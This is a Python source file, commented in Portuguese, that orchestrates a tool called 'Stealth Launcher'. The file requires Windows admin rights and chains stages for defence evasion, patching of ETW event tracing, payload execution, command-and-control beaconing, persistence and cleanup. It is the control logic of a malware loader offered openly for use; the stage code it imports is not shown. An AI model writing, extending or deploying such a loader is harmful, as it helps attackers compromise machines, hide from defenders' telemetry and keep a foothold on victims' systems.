#!/usr/bin/env python3
"""
stealth_launcher.orchestrator
Orquestra a execução completa do Stealth Launcher.
"""
import os
import sys
import logging
import threading
from logging import LoggerAdapter

from stealth_launcher.exceptions import StageError
from stealth_launcher.logger import setup_logging
from stealth_launcher.stages.persistence import is_admin
from stealth_launcher.config import load_config
from stealth_launcher.stages.mutex import acquire_mutex, release_mutex
from stealth_launcher.advanced.evasion_techniques import run_evasion  # <- Correto agora!
from stealth_launcher.stages.patching import patch_etw_stage
from stealth_launcher.stages.payload_execution import PayloadExecutor
from stealth_launcher.stages.beaconing import beaconing_stage
from stealth_launcher.stages.persistence import persistence_stage
from stealth_launcher.stages.cleanup import cleanup as cleanup_stage


def run(cfg):
    """
    Orquestra a execução de todas as etapas do Stealth Launcher.
    """
    # 1. Verifica plataforma e privilégios
    if os.name != "nt" or not is_admin():
        raise StageError("É necessário ser administrador no Windows")

    # 2. Configura logging
    setup_logging(cfg.log_file, cfg.verbose)
    root_logger = logging.getLogger()
    root_logger.info("=== Stealth Launcher iniciado ===")

    # 3. Garante execução única (mutex)
    mutex = acquire_mutex(cfg.mutex_name)

    # 4. Timeout global
    def on_timeout():
        root_logger.error("Timeout geral atingido, abortando.")
        os._exit(1)

    timer = threading.Timer(cfg.max_runtime_s, on_timeout)
    timer.start()

    # 5. Resultados por stage
    results = {}

    try:
        stages = [
            ("evasion", run_evasion),  # <- Corrigido
            ("patching", patch_etw_stage),
            ("payload_execution", lambda c: PayloadExecutor(c).execute()),
            ("beaconing", beaconing_stage),
            ("persistence", persistence_stage),
        ]

        for stage_name, stage_fn in stages:
            logger = LoggerAdapter(root_logger, {'stage': stage_name})
            logger.info(f"--- Stage: {stage_name} ---")
            try:
                stage_fn(cfg)
                results[stage_name] = True
                logger.info(f"Stage {stage_name} concluída com sucesso.")
            except StageError as se:
                results[stage_name] = False
                logger.exception(f"Stage {stage_name} abortado: {se}")
                if stage_name == "evasion":
                    raise
                else:
                    logger.warning(f"Continuando após falha em {stage_name}.")

        # 6. Health beacon opcional
        try:
            health_logger = LoggerAdapter(root_logger, {'stage': 'health'})
            health_logger.info(f"Resultados das stages: {results}")
            # TODO: health beacon real
        except Exception:
            root_logger.exception("Falha ao enviar health beacon")

    except StageError:
        root_logger.exception("Execução abortada devido a StageError")
        sys.exit(1)
    except Exception:
        root_logger.exception("Erro inesperado durante execução")
        sys.exit(1)
    finally:
        # 7. Cleanup
        timer.cancel()
        try:
            cleanup_stage()
        except Exception:
            root_logger.exception("Erro em cleanup_stage()")
        try:
            release_mutex(mutex)
        except Exception:
            root_logger.exception("Erro ao liberar mutex")
        root_logger.info("=== Stealth Launcher finalizado ===")


if __name__ == "__main__":
    cfg = load_config()
    run(cfg)
